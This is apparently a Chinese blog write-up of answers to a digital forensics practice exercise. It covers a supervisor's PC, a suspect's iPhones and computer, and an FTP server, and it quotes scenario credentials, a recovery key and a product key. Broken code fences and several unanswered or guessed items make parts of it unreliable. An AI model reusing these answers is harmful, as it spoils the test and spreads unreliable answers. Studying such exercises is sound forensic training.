<h2 id="题目11工地主管计算机內的ftp程序filezilla的用户名称是甚么-请以英文全大写及阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目11工地主管计算机內的ftp程序filezilla的用户名称是甚么-请以英文全大写及阿拉伯数字回答"></a> 题目11工地主管计算机內的FTP程序FileZilla的用户名称是甚么? (请以英文全大写及阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALEX</span><br></pre></td></tr></table></figure>
<ul>
<li>之前用火眼看找不到，现在使用美亚取证大师可以看得到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105183427463.png" alt="image-20241105183427463"></p>
<h2 id="题目12工地主管的team-viewer-id-是甚么-请以英文全大写及阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目12工地主管的team-viewer-id-是甚么-请以英文全大写及阿拉伯数字回答"></a> 题目12工地主管的Team Viewer ID 是甚么? (请以英文全大写及阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">435270306</span><br></pre></td></tr></table></figure>
<ul>
<li>直接就火眼查看即可</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105184224840.png" alt="image-20241105184224840"></p>
<h2 id="题目13工地主管的team-viewer与哪一个id连接-请以英文全大写及阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目13工地主管的team-viewer与哪一个id连接-请以英文全大写及阿拉伯数字回答"></a> 题目13工地主管的Team Viewer与哪一个ID连接? (请以英文全大写及阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">420190768</span><br></pre></td></tr></table></figure>
<ul>
<li>这题答案就在账户信息的下面</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105184325832.png" alt="image-20241105184325832"></p>
<h2 id="题目14多选题-工地主管曾用计算机浏览器作搜寻以下哪一个关键词他曾经搜寻"><a class="markdownIt-Anchor" href="#题目14多选题-工地主管曾用计算机浏览器作搜寻以下哪一个关键词他曾经搜寻"></a> 题目14**(多选题)** 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B. web whatsapp</span><br><span class="line">C. facebook</span><br></pre></td></tr></table></figure>
<ul>
<li>这题只有俩个选项是正确的，还有一个选项是故意写错名字挖坑的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105184642683.png" alt="image-20241105184642683"></p>
<h2 id="题目15工地主管计算机的windows系统的产品标识符是甚么-请以英文全大写及阿拉伯数字回答不用输入-"><a class="markdownIt-Anchor" href="#题目15工地主管计算机的windows系统的产品标识符是甚么-请以英文全大写及阿拉伯数字回答不用输入-"></a> 题目15工地主管计算机的Windows系统的产品标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">003311000000001AA962</span><br></pre></td></tr></table></figure>
<ul>
<li>产品标识符其实就是产品ID</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105172728052.png" alt="image-20241105172728052"></p>
<h2 id="题目16工地主管曾用计算机使用whatsapp他曾和以下哪个电话号码沟通"><a class="markdownIt-Anchor" href="#题目16工地主管曾用计算机使用whatsapp他曾和以下哪个电话号码沟通"></a> 题目16工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无通话记录</span><br></pre></td></tr></table></figure>
<ul>
<li>计算机上没有WhatsApp，所以根本就没有通话记录</li>
</ul>
<h2 id="题目17多选题-工地主管计算机的用户名称是甚么-其用户标识符是甚么"><a class="markdownIt-Anchor" href="#题目17多选题-工地主管计算机的用户名称是甚么-其用户标识符是甚么"></a> 题目17**(多选题)** 工地主管计算机的用户名称是甚么? 其用户标识符是甚么?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A.用户名称: PC1</span><br><span class="line">F.用户标识符:0x000003E9</span><br></pre></td></tr></table></figure>
<ul>
<li>这题答案换成了十六进制的形式</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105185728088.png" alt="image-20241105185728088"></p>
<ul>
<li>十进制的1001转换为16进制也就是0x3E9</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105185819627.png" alt="image-20241105185819627"></p>
<h2 id="题目18单选题-工地主管计算机的预设浏览器是甚么"><a class="markdownIt-Anchor" href="#题目18单选题-工地主管计算机的预设浏览器是甚么"></a> 题目18**(单选题)** 工地主管计算机的预设浏览器是甚么?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.Chrome</span><br></pre></td></tr></table></figure>
<ul>
<li>预设浏览器其实就是默认浏览器，直接查看浏览器的浏览记录，从浏览记录的多少可以判断出预设浏览器</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105173303191.png" alt="image-20241105173303191"></p>
<ul>
<li>也可以直接查看配置得到默认浏览器</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105185024266.png" alt="image-20241105185024266"></p>
<h2 id="题目19工地主管计算机的其中一个分区被人加密分区内的电子表格material3xlsx的哈希值sha1是甚么-请以英文全大写及阿拉伯数字回答"><a class="markdownIt-Anchor" href="#题目19工地主管计算机的其中一个分区被人加密分区内的电子表格material3xlsx的哈希值sha1是甚么-请以英文全大写及阿拉伯数字回答"></a> 题目19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的哈希值(SHA1)是甚么? (请以英文全大写及阿拉伯数字回答)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40418B21F6C3E4AF306D5EF3B80A776DA72FC1D2</span><br></pre></td></tr></table></figure>
<ul>
<li>这题加密的恢复文本在FTP的服务器中，所以光找被加密的那个系统是不能找到的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105224451629.png" alt="image-20241105224451629"></p>
<ul>
<li>导出后得到恢复密钥</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">209451-527087-001254-240735-481855-489566-611721-343497</span><br></pre></td></tr></table></figure>
<ul>
<li>得到密钥后直接恢复被加密的磁盘，或者在火眼仿真中直接输入密钥，或者在美亚取证大师中直接输入密钥。然后就可以找到该文件并计算哈希值</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241106102015257.png" alt="image-20241106102015257"></p>
<h2 id="题目20多选题-路由器的记录中显示以下有哪些ip是公司的电子器材"><a class="markdownIt-Anchor" href="#题目20多选题-路由器的记录中显示以下有哪些ip是公司的电子器材"></a> 题目20**(多选题)** 路由器的记录中显示以下有哪些IP是公司的电子器材?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A.192.168.40.128</span><br><span class="line">B.192.168.40.129</span><br><span class="line">C.192.168.40.130</span><br><span class="line">D.192.168.40.131</span><br></pre></td></tr></table></figure>
<ul>
<li>直接字符串搜索ip地址，发现只有E的ip<code>192.168.40.132</code>，搜索不到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105173838049.png" alt="image-20241105173838049"></p>
<h2 id="题目21"><a class="markdownIt-Anchor" href="#题目21-2"></a> 题目21</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Visited: PC1@https://www.bing.com/search?q=ftp://218.255.242.114/&amp;PC=MENEPB</span><br></pre></td></tr></table></figure>
<h2 id="题目24单选题-路由器的记录中显示哪一个ip曾以teamviewer-连接公司计算机"><a class="markdownIt-Anchor" href="#题目24单选题-路由器的记录中显示哪一个ip曾以teamviewer-连接公司计算机"></a> 题目24**(单选题)** 路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机?</h2>
<h2 id="题目27单选题-阿力士-iphone12pro电话于2021年10月21日以下哪张相片可能曾被分享utc8"><a class="markdownIt-Anchor" href="#题目27单选题-阿力士-iphone12pro电话于2021年10月21日以下哪张相片可能曾被分享utc8"></a> 题目27**(单选题)** 阿力士 iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC+8）？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A. IMG_0011.HEIC</span><br></pre></td></tr></table></figure>
<ul>
<li>查看得到选项图片的日期都是19日，但是某个图片有两张，然后还有一张图片保存路径在不同，故推断是这张照片</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105201451260.png" alt="image-20241105201451260"></p>
<h2 id="题目28单选-阿力士iphone-12-pro电话中哪一张相片可能曾被修改拍摄时间"><a class="markdownIt-Anchor" href="#题目28单选-阿力士iphone-12-pro电话中哪一张相片可能曾被修改拍摄时间"></a> 题目28[单选] 阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A. IMG_0011.HEIC</span><br></pre></td></tr></table></figure>
<ul>
<li>结合第36题可以知道是11被改了</li>
</ul>
<h2 id="题目29填空题-阿力士iphone-12-pro-的gsm媒体访问控制地址是什么-请以英文全大写及阿拉伯数字回答不用输入quot"><a class="markdownIt-Anchor" href="#题目29填空题-阿力士iphone-12-pro-的gsm媒体访问控制地址是什么-请以英文全大写及阿拉伯数字回答不用输入"></a> 题目29[填空题] 阿力士iPhone 12 pro 的GSM媒体访问控制地址是什么? (请以英文全大写及阿拉伯数字回答，不用输入&quot;😊</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e06d17382420</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这里不明白什么是GSM，问了下Ai：GSM（Global System for Mobile Communications）是一种全球广泛应用的蜂窝网络标准，支持语音和数据传输。iPhone 12 Pro支持全球的GSM网络，确保可以在大部分国家和地区使用。</p>
</li>
<li>
<p>这里其实可能就是wifi的网卡地址</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105210800563.png" alt="image-20241105210800563"></p>
<h2 id="题目30单选题-阿力士的iphone-12-pro以什么屏幕密码保护"><a class="markdownIt-Anchor" href="#题目30单选题-阿力士的iphone-12-pro以什么屏幕密码保护"></a> 题目30[单选题] 阿力士的iphone 12 pro以什么屏幕密码保护?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D. 以上皆非</span><br></pre></td></tr></table></figure>
<ul>
<li>找不到密码，所以填以上皆非</li>
</ul>
<h2 id="题目31多选题-阿力士iphone-12-pro内以下哪一张相片是实况相片live-photos"><a class="markdownIt-Anchor" href="#题目31多选题-阿力士iphone-12-pro内以下哪一张相片是实况相片live-photos"></a> 题目31[多选题] 阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A. IMG_0011.HEIC</span><br><span class="line">B. IMG_0010.HEIC</span><br><span class="line">D. IMG_0009.HEIC</span><br></pre></td></tr></table></figure>
<ul>
<li>这里面没有12的照片</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241106103236128.png" alt="image-20241106103236128"></p>
<h2 id="题目32单选题-以下哪一个是阿力士iphone-12-pro可能曾经连接的装置名称"><a class="markdownIt-Anchor" href="#题目32单选题-以下哪一个是阿力士iphone-12-pro可能曾经连接的装置名称"></a> 题目32[单选题] 以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A. Chris’s MacBook Pro</span><br></pre></td></tr></table></figure>
<ul>
<li>查看时间线可以看到</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241105200352196.png" alt="image-20241105200352196"></p>
<h2 id="题目33单选题-接上题记录连接时间是什么时候utc8"><a class="markdownIt-Anchor" href="#题目33单选题-接上题记录连接时间是什么时候utc8"></a> 题目33[单选题] 接上题，记录连接时间是什么时候(UTC+8)?</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B. 2021年10月21日 08:58:01</span><br></pre></td></tr></table></figure>
<ul>
<li>直接看题目32截图，可以看到答案</li>
</ul>
<h2 id="题目34多选题-阿力士iphone-xr中在软件whatsapp中工地主管与阿力士的对话中曾提到佢叫我俾钱喎btc係唔係呢个啊-在进行电子数据取证分析后以下哪一个是有可能关于此对话的正确描述"><a class="markdownIt-Anchor" href="#题目34多选题-阿力士iphone-xr中在软件whatsapp中工地主管与阿力士的对话中曾提到佢叫我俾钱喎btc係唔係呢个啊-在进行电子数据取证分析后以下哪一个是有可能关于此对话的正确描述"></a> 题目34[多选题] 阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：[佢叫我俾钱喎，BTC係唔係呢个啊？]。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">+ 查看工地主管的聊天记录，发现没有被删除，所以A选项排除</span><br><span class="line"></span><br><span class="line">![image-20241106103431715](电子数据取证刷题1/image-20241106103431715.png)</span><br><span class="line"></span><br><span class="line">## 题目35[填空题] 阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC? (请以阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接查看`iPhone XR`的对话即可得到答案</span><br><span class="line"></span><br><span class="line">![image-20241105200847812](电子数据取证刷题1/image-20241105200847812.png)</span><br><span class="line"></span><br><span class="line">## 题目36[多选题] 阿力士iPhone XR中 “IMG_0056.HEIC”的图像与&quot;5005.JPG&quot;(MD5: 96c48152249536d14eaa80086c92fcb9)” 看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>B. 有不同哈希值<br>
C. IMG_0056.HEIC 为原图，5005.JPG(MD5: 96c48152249536d14eaa80086c92fcb9)为缩略图</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接对比俩个图片，结合常识得到</span><br><span class="line"></span><br><span class="line">![image-20241105213746725](电子数据取证刷题1/image-20241105213746725.png)</span><br><span class="line"></span><br><span class="line">## 题目37[多选题] 阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>A. 此相片是由隔空投送 (Airdrop)得来<br>
C. 此相片的拍摄时间为2021-10-21 17:45:48(UTC+8)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 之前有看到阿力士的另一部手机中看到该图片，推断是从那部手机从`Airdrop`得来的，然后就直接A。由于当时拍摄是10月21而不是9月所以直接得到</span><br><span class="line"></span><br><span class="line">## 题目38[单选题] 阿力士iPhone XR中阿力士的电邮账户[Alexc19851016@gmail.com](mailto:Alexc19851016@gmail.com)的密码有可能是什么?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>C. Aa475869!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 这题在手机上不好找到，而在Alex的电脑上很容易找到</span><br><span class="line"></span><br><span class="line">![image-20241106103810316](电子数据取证刷题1/image-20241106103810316.png)</span><br><span class="line"></span><br><span class="line">## 题目39[填空题] 阿力士iPhone XR曾经连接Wifi “Alex Home”的密码是什么? (请以英文全大写及阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>12345678</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接搜素关键字即可</span><br><span class="line"></span><br><span class="line">![image-20241106103917639](电子数据取证刷题1/image-20241106103917639.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题目40[单选题] 阿力士iPhone XR经iCloud备份的最后时间是什么?(UTC+8)?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>A. 2021-10-21 17:51:38(UTC+8)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 这题搜索就能看到，但是这题有坑该时间不是utc+8</span><br><span class="line"></span><br><span class="line">![image-20241106104504351](电子数据取证刷题1/image-20241106104504351.png)</span><br><span class="line"></span><br><span class="line">## 题目41[填空题] 阿力士iPhone XR中的iBoot版本是iBoot-[______]? (请以阿拉伯数字回答，不用轮入&quot;.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>672312036</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接找到iboot</span><br><span class="line"></span><br><span class="line">![image-20241106105133578](电子数据取证刷题1/image-20241106105133578.png)</span><br><span class="line"></span><br><span class="line">## 题目42[多选题] 阿力士iPhone XR中的WhatsApp群组『团购-新鲜猪肉牛肉-东涌群组-9/30』有以下哪一个成员?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>A. <a href="mailto:85260617332@s.whatsapp.net">85260617332@s.whatsapp.net</a><br>
D. <a href="mailto:85264630956@s.whatsapp.net">85264630956@s.whatsapp.net</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 先找到该群，然后查看该群的人员</span><br><span class="line"></span><br><span class="line">![image-20241106105704224](电子数据取证刷题1/image-20241106105704224.png)</span><br><span class="line"></span><br><span class="line">+ 然后就会发现以下用户</span><br><span class="line"></span><br><span class="line">![image-20241106110106118](电子数据取证刷题1/image-20241106110106118.png)</span><br><span class="line"></span><br><span class="line">## 题目43[单选题] 阿力士的计算机显示曾于hongkongcard.com 的论坛登记成为会员，以下哪个是他的帐户密码?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Aa475869!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接火眼一把梭</span><br><span class="line"></span><br><span class="line">![image-20241105220641348](电子数据取证刷题1/image-20241105220641348.png)</span><br><span class="line"></span><br><span class="line">## 题目44[单选题] 阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 题目46</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>218255242114</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 还是火眼一把梭</span><br><span class="line"></span><br><span class="line">![image-20241105220845543](电子数据取证刷题1/image-20241105220845543.png)</span><br><span class="line"></span><br><span class="line">## 题目47[填空题] 阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次? (请以阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 题目48[填空题] 阿力士计算机所安装的Microsoft Office 2007 是以下哪一个版本? (请以亚拉伯数字作答，省去&quot;.&quot;符号)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>12045181014</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接查看这个文件得到版本号</span><br><span class="line"></span><br><span class="line">![image-20241106111920517](电子数据取证刷题1/image-20241106111920517.png)</span><br><span class="line"></span><br><span class="line">## 题目49[填空题]以下是阿力士计算机中的Basic data partition (EFI 3) 的Volume ID?(请以英文全大写及阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题目50[填空题] 阿力士计算机的Window product ID是什么? (请以英文全大写及阿拉伯数字回答，不用输入&quot;-&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>003311000000001AA411</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 还是纯送分</span><br><span class="line"></span><br><span class="line">![image-20241105224103307](电子数据取证刷题1/image-20241105224103307.png)</span><br><span class="line"></span><br><span class="line">## 题目52[填空题] 阿力士计算机所安装的Microsoft Office 2007 的密钥是甚么? (请以英文全大写及阿拉伯数字回答，不用输入&quot;-&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>V77WQRPVP67MTPGWH3G9D44MJ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接一把梭</span><br><span class="line"></span><br><span class="line">![image-20241105225434646](电子数据取证刷题1/image-20241105225434646.png)</span><br><span class="line"></span><br><span class="line">## 题目53[单选题] 阿力士FTP 服务器用户使用命令行安装了甚么程序?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>A. Docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 直接查看命令行得到Docker</span><br><span class="line"></span><br><span class="line">![image-20241105221905659](电子数据取证刷题1/image-20241105221905659.png)</span><br><span class="line"></span><br><span class="line">## 题目54[多选题] 以下哪些档案于阿力士FTP 服务器曾重复出现?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>D. Staff1<br>
E. Staff2<br>
F. Staff3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 纯送分，看这写</span><br><span class="line"></span><br><span class="line">![image-20241105223642147](电子数据取证刷题1/image-20241105223642147.png)</span><br><span class="line"></span><br><span class="line">## 题目55[填空题] 在阿力士FTP服务器中，文件夹___曾被用户变更了访问权限(请以英文全大写及阿拉伯数字回答)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
